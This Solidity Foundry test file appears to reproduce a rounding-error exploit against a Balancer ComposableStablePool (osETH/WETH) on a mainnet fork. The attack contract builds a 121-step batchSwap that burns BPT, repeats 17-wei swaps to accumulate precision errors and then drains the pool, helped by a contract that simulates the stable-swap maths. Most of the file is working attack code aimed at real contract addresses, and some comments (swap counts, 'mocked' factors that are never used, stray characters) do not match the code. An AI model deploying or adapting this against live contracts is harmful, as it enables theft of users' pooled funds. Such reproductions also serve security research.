// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import "forge-std/Test.sol";
import "../../interface/interface.sol";

interface IComposableStablePool is IERC20 {
    function getPoolId() external view returns (bytes32);
    function getBptIndex() external view returns (uint256);
    function getScalingFactors() external view returns (uint256[] memory);
    function getRateProviders() external view returns (IRateProvider[] memory);
    function updateTokenRateCache(IERC20 token) external;
    function getAmplificationParameter()
        external
        view
        returns (uint256 value, bool isUpdating, uint256 precision);
    function getSwapFeePercentage() external view returns (uint256);
    function getRate() external view returns (uint256);
    function getActualSupply() external view returns (uint256);
}

interface IRateProvider {
    function getRate() external view returns (uint256);
}

contract BalancerPoC is Test {
    BalancerExploit exploitContract;

    constructor() {
        // Fork Mainnet chain at block just before the exploit
        vm.createSelectFork("mainnet", 23717397 - 1);
        vm.warp(1762156007);
    }

    function testExploit() public {
        exploitContract = new BalancerExploit();
    }
}

contract BalancerExploit is Test {
    Calculator calculator;
    IBalancerVault public balancerVault;
    IComposableStablePool composableStablePool;
    bytes32 poolId;
    uint256 bptIndex;
    IERC20[] poolTokens;
    IERC20 weth;
    IERC20 osETH;

    uint256 phase1TargetBalance = 67000;
    uint256 smallValue = 17;

    constructor() payable {
        calculator = new Calculator();

        balancerVault = IBalancerVault(
            0xBA12222222228d8Ba445958a75a0704d566BF2C8
        );
        composableStablePool = IComposableStablePool(
            0xDACf5Fa19b1f720111609043ac67A9818262850c
        );

        poolId = bytes32(composableStablePool.getPoolId());
        bptIndex = composableStablePool.getBptIndex();
        (poolTokens, , ) = balancerVault.getPoolTokens(bytes32(poolId));
        weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
        osETH = IERC20(poolTokens[2]);

        weth.approve(address(balancerVault), type(uint256).max);
        composableStablePool.approve(address(balancerVault), type(uint256).max);
        osETH.approve(address(balancerVault), type(uint256).max);

        uint256[] memory scalingFactors = composableStablePool
            .getScalingFactors();
        console.log(
            "Initial scaling factors:",
            scalingFactors[0],
            scalingFactors[1],
            scalingFactors[2]
        );

        composableStablePool.updateTokenRateCache(osETH);

        (uint256 amp, , ) = composableStablePool.getAmplificationParameter();
        console.log("Initial amplification parameter:", amp);
        uint256 swapFee = composableStablePool.getSwapFeePercentage();
        console.log("Initial swap fee percentage:", swapFee);
        uint256 actualSupply = composableStablePool.getActualSupply();
        console.log("Initial actual supply:", actualSupply);

        // Mock scalingFactors to use specific value for osETH
        uint256[] memory mockedScalingFactors = new uint256[](3);
        mockedScalingFactors[0] = 1e18; // osETH scaling
        mockedScalingFactors[1] = 1e18; // BPT scaling
        mockedScalingFactors[2] = 1058132408689971699; // WETH scaling (fixed value)ㅌㅈ

        scalingFactors = composableStablePool.getScalingFactors();
        console.log(
            "Updated scaling factors:",
            scalingFactors[0],
            scalingFactors[1],
            scalingFactors[2]
        );

        (uint256 osETHBalance, , , ) = balancerVault.getPoolTokenInfo(
            poolId,
            osETH
        );

        (uint256 bptTokenBalance, , , ) = balancerVault.getPoolTokenInfo(
            poolId,
            composableStablePool
        );

        (uint256 wethBalance, , , ) = balancerVault.getPoolTokenInfo(
            poolId,
            weth
        );
        console.log(
            "Initial pool balances:",
            wethBalance,
            bptTokenBalance,
            osETHBalance
        );

        IBalancerVault.FundManagement memory fundManagement = IBalancerVault
            .FundManagement({
                sender: address(this),
                fromInternalBalance: true,
                recipient: payable(address(this)),
                toInternalBalance: true
            });

        // Total swaps: 122 (Phase1: 22 + Phase2: 90 + Phase3: 8 + Cleanup: 2)
        IBalancerVault.BatchSwapStep[]
            memory batchSwapData = new IBalancerVault.BatchSwapStep[](121);
        uint256 swapIndex = 0;

        // ========== PHASE 1: Geometric Decrease (รท100 progression) ==========
        // Purpose: Burn BPT progressively to set rounding boundary
        uint256[11] memory phase1Amounts0 = [
            uint256(4873132999218408001625),
            48731329992184080017,
            487313299921840800,
            4873132999218408,
            48731329992184,
            487313299922,
            4873132999,
            48731330,
            487313,
            4873,
            50
        ];
        uint256[11] memory phase1Amounts2 = [
            uint256(6783065423678905706961),
            67830654236789057069,
            678306542367890571,
            6783065423678906,
            67830654236789,
            678306542367,
            6783065424,
            67830654,
            678307,
            6783,
            69
        ];

        for (uint256 i = 0; i < 11; i++) {
            // BPT -> osETH
            batchSwapData[swapIndex++] = IBalancerVault.BatchSwapStep({
                poolId: poolId,
                assetInIndex: 1, // BPT
                assetOutIndex: 0, // osETH
                amount: phase1Amounts0[i],
                userData: ""
            });

            // BPT -> WETH
            batchSwapData[swapIndex++] = IBalancerVault.BatchSwapStep({
                poolId: poolId,
                assetInIndex: 1, // BPT
                assetOutIndex: 2, // WETH
                amount: phase1Amounts2[i],
                userData: ""
            });
        }

        // ========== PHASE 2: Precision Exploitation (17 wei magic number) ==========
        // Purpose: Accumulate rounding errors through repeated 17 wei swaps
        // Each iteration: Prime → Exploit (17 wei) → Reset
        {
            uint256[] memory scalingFactorsForCalc = new uint256[](2);
            scalingFactorsForCalc[0] = scalingFactors[0]; // osETH
            scalingFactorsForCalc[1] = scalingFactors[2]; // WETH

            uint256[] memory currentBalances = new uint256[](2);
            currentBalances[0] = phase1TargetBalance;
            currentBalances[1] = phase1TargetBalance;

            // Run 30 iterations of triplet swaps
            for (uint256 i = 0; i < 30; i++) {
                // STEP 1: Prime Swap (osETH -> WETH)
                uint256 primeAmount = currentBalances[1] - smallValue - 1;

                batchSwapData[swapIndex++] = IBalancerVault.BatchSwapStep({
                    poolId: poolId,
                    assetInIndex: 0,
                    assetOutIndex: 2,
                    amount: primeAmount,
                    userData: ""
                });

                uint256[] memory tempBalances = calculator.calculateSwap(
                    currentBalances,
                    scalingFactorsForCalc,
                    0,
                    1,
                    primeAmount,
                    amp,
                    swapFee
                );
                currentBalances[0] = tempBalances[0];
                currentBalances[1] = tempBalances[1];

                // STEP 2: Exploit Swap (osETH -> WETH, 17 wei)
                batchSwapData[swapIndex++] = IBalancerVault.BatchSwapStep({
                    poolId: poolId,
                    assetInIndex: 0,
                    assetOutIndex: 2,
                    amount: smallValue,
                    userData: ""
                });

                console.log(
                    "currentBalances before prime:",
                    currentBalances[0],
                    currentBalances[1]
                );

                tempBalances = calculator.calculateSwap(
                    currentBalances,
                    scalingFactorsForCalc,
                    0,
                    1,
                    smallValue,
                    amp,
                    swapFee
                );
                currentBalances[0] = tempBalances[0];
                currentBalances[1] = tempBalances[1];

                // STEP 3: Reset Swap (WETH -> osETH)
                uint256 resetAmount = currentBalances[0] - phase1TargetBalance;

                batchSwapData[swapIndex++] = IBalancerVault.BatchSwapStep({
                    poolId: poolId,
                    assetInIndex: 2,
                    assetOutIndex: 0,
                    amount: resetAmount,
                    userData: ""
                });

                tempBalances = calculator.calculateSwap(
                    currentBalances,
                    scalingFactorsForCalc,
                    1,
                    0,
                    resetAmount,
                    amp,
                    swapFee
                );
                currentBalances[0] = tempBalances[0];
                currentBalances[1] = tempBalances[1];
            }
        }

        // ========== PHASE 3: Geometric Increase (ร—1000 progression) ==========
        // Purpose: Extract profit at manipulated prices
        uint256[4] memory phase3Amounts = [
            uint256(10_000),
            10_000_000_000,
            10_000_000_000_000_000,
            10_000_000_000_000_000_000_000
        ];

        for (uint256 i = 0; i < 4; i++) {
            // osETH -> BPT
            batchSwapData[swapIndex++] = IBalancerVault.BatchSwapStep({
                poolId: poolId,
                assetInIndex: 0, // osETH
                assetOutIndex: 1, // BPT
                amount: phase3Amounts[i],
                userData: ""
            });

            // WETH -> BPT
            if (i != 3) {
                batchSwapData[swapIndex++] = IBalancerVault.BatchSwapStep({
                    poolId: poolId,
                    assetInIndex: 2, // WETH
                    assetOutIndex: 1, // BPT
                    amount: phase3Amounts[i] * 1000, // WETH amounts are 1000x osETH
                    userData: ""
                });
            }
        }

        // Final cleanup swaps (exact amounts to drain the pool)
        batchSwapData[swapIndex++] = IBalancerVault.BatchSwapStep({
            poolId: poolId,
            assetInIndex: 2, // WETH
            assetOutIndex: 1, // BPT
            amount: 941319322493191942754,
            userData: ""
        });

        batchSwapData[swapIndex++] = IBalancerVault.BatchSwapStep({
            poolId: poolId,
            assetInIndex: 0, // osETH
            assetOutIndex: 1, // BPT
            amount: 941319322493191942754,
            userData: ""
        });

        address[] memory poolTokensAddr = new address[](poolTokens.length);
        for (uint256 i = 0; i < poolTokens.length; i++) {
            poolTokensAddr[i] = address(poolTokens[i]);
        }

        int256[] memory limits = new int256[](poolTokens.length);
        for (uint256 i = 0; i < poolTokens.length; i++) {
            limits[i] = type(int256).max;
        }

        balancerVault.batchSwap(
            IBalancerVault.SwapKind.GIVEN_OUT,
            batchSwapData,
            poolTokensAddr,
            fundManagement,
            limits,
            block.timestamp + 300
        );
    }
}

contract Calculator is Test {
    uint256 private constant ONE = 1e18;
    uint256 private constant AMP_PRECISION = 1e3;

    /**
     * @notice Calculate swap and return resulting balances (GIVEN_OUT mode)
     * @param balances Array of token balances [balance0, balance1]
     * @param scalingFactors Array of scaling factors [scaling0, scaling1]
     * @param tokenIndexIn Index of input token (0 or 1)
     * @param tokenIndexOut Index of output token (0 or 1)
     * @param amountOut Amount to receive (GIVEN_OUT)
     * @param amplificationParameter Amplification parameter (e.g., 200000)
     * @param swapFeePercentage Swap fee (e.g., 100000000000000 = 0.01%)
     * @return Array of new balances after swap
     */
    function calculateSwap(
        uint256[] memory balances,
        uint256[] memory scalingFactors,
        uint256 tokenIndexIn,
        uint256 tokenIndexOut,
        uint256 amountOut,
        uint256 amplificationParameter,
        uint256 swapFeePercentage
    ) external pure returns (uint256[] memory) {
        require(tokenIndexIn != tokenIndexOut, "Same token");

        // 1. Upscale balances
        uint256[] memory scaledBalances = new uint256[](2);
        scaledBalances[0] = _upscale(balances[0], scalingFactors[0]);
        scaledBalances[1] = _upscale(balances[1], scalingFactors[1]);

        // 2. Upscale amountOut
        uint256 scaledAmountOut = _upscale(
            amountOut,
            scalingFactors[tokenIndexOut]
        );
        console.log("Scaled Amount Out:", scaledAmountOut);

        // 3. Calculate invariant
        uint256 invariant = _calculateInvariant(
            amplificationParameter,
            scaledBalances
        );
        console.log("Invariant:", invariant);

        // 4. Calculate amountIn needed (before fee)
        uint256 scaledAmountIn = _calcInGivenOut(
            amplificationParameter,
            scaledBalances,
            tokenIndexIn,
            tokenIndexOut,
            scaledAmountOut,
            invariant
        );

        // 5. Add swap fee: amountIn = amountInBeforeFee / (1 - fee)
        // Equivalent to: amountIn = amountInBeforeFee * ONE / (ONE - fee)
        scaledAmountIn = _divUp(scaledAmountIn * ONE, ONE - swapFeePercentage);

        // 6. Update scaled balances
        scaledBalances[tokenIndexIn] =
            scaledBalances[tokenIndexIn] +
            scaledAmountIn;
        scaledBalances[tokenIndexOut] =
            scaledBalances[tokenIndexOut] -
            scaledAmountOut;

        // 7. Downscale back to original
        // Both use downscaleDown for final balances
        uint256[] memory finalBalances = new uint256[](2);
        finalBalances[0] = _downscaleDown(scaledBalances[0], scalingFactors[0]);
        finalBalances[1] = _downscaleDown(scaledBalances[1], scalingFactors[1]);

        return finalBalances;
    }

    function _upscale(
        uint256 amount,
        uint256 scalingFactor
    ) internal pure returns (uint256) {
        return (amount * scalingFactor) / ONE;
    }

    function _divUp(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "Division by zero");
        if (a == 0) {
            return 0;
        }
        return 1 + ((a - 1) / b);
    }

    function _downscaleDown(
        uint256 amount,
        uint256 scalingFactor
    ) internal pure returns (uint256) {
        // FixedPoint.divDown: round down
        return (amount * ONE) / scalingFactor;
    }

    function _downscaleUp(
        uint256 amount,
        uint256 scalingFactor
    ) internal pure returns (uint256) {
        // FixedPoint.divUp: round up
        uint256 quotient = (amount * ONE) / scalingFactor;
        if ((quotient * scalingFactor) < (amount * ONE)) {
            return quotient + 1;
        }
        return quotient;
    }

    function _calculateInvariant(
        uint256 amp,
        uint256[] memory balances
    ) internal pure returns (uint256) {
        uint256 sum = balances[0] + balances[1];
        if (sum == 0) return 0;

        uint256 prevInvariant;
        uint256 invariant = sum;
        uint256 numTokens = 2;
        uint256 ampTimesTotal = amp * numTokens;

        for (uint256 iter = 0; iter < 255; iter++) {
            // Calculate D_P = D^(n+1) / (n^n * P)
            uint256 D_P = invariant;
            D_P = (D_P * invariant) / (balances[0] * numTokens);
            D_P = (D_P * invariant) / (balances[1] * numTokens);

            prevInvariant = invariant;

            // numerator = (Ann * sum / AMP_PRECISION + D_P * n) * invariant
            uint256 numerator = (((ampTimesTotal * sum) / AMP_PRECISION) +
                (D_P * numTokens)) * invariant;

            // denominator = ((Ann - AMP_PRECISION) * invariant) / AMP_PRECISION + (n + 1) * D_P
            uint256 denominator = (((ampTimesTotal - AMP_PRECISION) *
                invariant) / AMP_PRECISION) + ((numTokens + 1) * D_P);

            invariant = numerator / denominator;

            // Check convergence
            if (invariant > prevInvariant) {
                if (invariant - prevInvariant <= 1) {
                    return invariant;
                }
            } else {
                if (prevInvariant - invariant <= 1) {
                    return invariant;
                }
            }
        }

        revert("STABLE_INVARIANT_DIDNT_CONVERGE");
    }

    function _calcInGivenOut(
        uint256 amp,
        uint256[] memory balances,
        uint256 tokenIndexIn,
        uint256 tokenIndexOut,
        uint256 amountOut,
        uint256 invariant
    ) internal pure returns (uint256) {
        // Temporarily reduce balance of tokenOut
        balances[tokenIndexOut] = balances[tokenIndexOut] - amountOut;
        console.log("Temp balance out:", balances[tokenIndexOut]);

        // Calculate new balance of tokenIn needed to maintain invariant
        uint256 finalBalanceIn = _getTokenBalanceGivenInvariantAndAllOtherBalances(
                amp,
                balances,
                invariant,
                tokenIndexIn
            );

        // Restore balance
        balances[tokenIndexOut] = balances[tokenIndexOut] + amountOut;

        // AmountIn = newBalance - currentBalance (round up)
        return (finalBalanceIn - balances[tokenIndexIn]) + 1;
    }

    function _getTokenBalanceGivenInvariantAndAllOtherBalances(
        uint256 amp,
        uint256[] memory balances,
        uint256 invariant,
        uint256 tokenIndex
    ) internal pure returns (uint256) {
        uint256 numTokens = balances.length;
        uint256 ampTimesTotal = amp * numTokens;

        // Calculate sum and P_D (excluding tokenIndex)
        uint256 sum = balances[0];
        uint256 P_D = balances[0] * numTokens;

        for (uint256 j = 1; j < numTokens; j++) {
            P_D = (P_D * balances[j] * numTokens) / invariant;
            sum = sum + balances[j];
        }
        sum = sum - balances[tokenIndex];

        // Calculate coefficients for quadratic equation
        uint256 inv2 = invariant * invariant;
        uint256 c = ((inv2 / (ampTimesTotal * P_D)) * AMP_PRECISION) *
            balances[tokenIndex];
        uint256 b = sum + ((invariant / ampTimesTotal) * AMP_PRECISION);

        // Initial guess
        uint256 prevTokenBalance = 0;
        uint256 tokenBalance = (inv2 + c) / (invariant + b);

        // Newton-Raphson iteration
        for (uint256 iter = 0; iter < 255; iter++) {
            prevTokenBalance = tokenBalance;

            // y_n+1 = (y_n^2 + c) / (2*y_n + b - D)
            tokenBalance =
                ((tokenBalance * tokenBalance) + c) /
                ((tokenBalance * 2) + b - invariant);

            // Check convergence
            if (tokenBalance > prevTokenBalance) {
                if (tokenBalance - prevTokenBalance <= 1) {
                    return tokenBalance;
                }
            } else {
                if (prevTokenBalance - tokenBalance <= 1) {
                    return tokenBalance;
                }
            }
        }

        revert("STABLE_GET_BALANCE_DIDNT_CONVERGE");
    }
}
